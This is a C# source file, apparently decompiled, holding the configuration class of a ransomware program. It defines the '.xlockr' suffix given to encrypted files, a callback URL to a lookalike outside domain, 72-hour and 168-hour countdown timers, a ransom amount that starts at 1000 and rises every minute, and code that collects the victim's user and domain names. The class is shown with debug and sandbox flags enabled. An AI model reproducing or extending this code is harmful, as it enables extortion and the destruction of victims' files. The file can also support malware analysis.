using System;
using System.IO;
using System.Reflection;

namespace Extension;

public class Config
{
	public static string CurrentFolder = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

	public static string AppDataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Extension");

	public static string DesktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	public static string SandBoxDirectory = Path.Combine(DesktopFolder, "Test");

	public static string UserDomain = Environment.UserDomainName;

	public static string UserName = Environment.UserName;

	public static string UserDomainName = UserDomain + "\\" + UserName;

	public static bool IsDebugMode = true;

	public static bool IsSandBox = true;

	public static string EncryptedFileSuffix = ".xlockr";

	public static int LostTimerHours = 168;

	public static int LostTimerMinutes = 0;

	public static int LostTimerSeconds = 0;

	public static int RiseTimerHours = 72;

	public static int RiseTimerMinutes = 0;

	public static int RiseTimerSeconds = 0;

	public static string CallbackUrl = "http://app.remaxgllobal.com/check.php";

	public static UserData User = new UserData();

	public static int RiseMil = 60000;

	public static string DatFilePath
	{
		get
		{
			if (!Directory.Exists(AppDataFolder))
			{
				Directory.CreateDirectory(AppDataFolder);
			}
			return AppDataFolder + "\\Extension.dat";
		}
	}

	public static int AmountToCharge
	{
		get
		{
			DateTime creationTime = File.GetCreationTime(DatFilePath);
			if (LostTime.TotalMilliseconds > 0.0)
			{
				double totalMilliseconds = (DateTime.Now - creationTime).TotalMilliseconds;
				double num = ((totalMilliseconds > 0.0) ? Math.Floor(totalMilliseconds / (double)RiseMil) : 0.0);
				return 1000 + (int)num;
			}
			double totalMilliseconds2 = (creationTime.AddDays(3.0) - creationTime).TotalMilliseconds;
			double num2 = ((totalMilliseconds2 > 0.0) ? Math.Floor(totalMilliseconds2 / (double)RiseMil) : 0.0);
			return 1000 + (int)num2;
		}
	}

	public static TimeSpan LostTime
	{
		get
		{
			TimeSpan result = File.GetCreationTime(DatFilePath).AddDays(3.0) - DateTime.Now;
			if (!(result.TotalMilliseconds > 0.0))
			{
				return TimeSpan.FromMilliseconds(0.0);
			}
			return result;
		}
	}

	public static TimeSpan? RiseTime
	{
		get
		{
			DateTime creationTime = File.GetCreationTime(DatFilePath);
			double totalMilliseconds = (DateTime.Now - creationTime).TotalMilliseconds;
			double num = (double)RiseMil - totalMilliseconds % (double)RiseMil;
			double totalMilliseconds2 = LostTime.TotalMilliseconds;
			if (num > 0.0 && num <= (double)RiseMil && totalMilliseconds2 > (double)RiseMil)
			{
				return TimeSpan.FromMilliseconds(num);
			}
			return null;
		}
	}
}
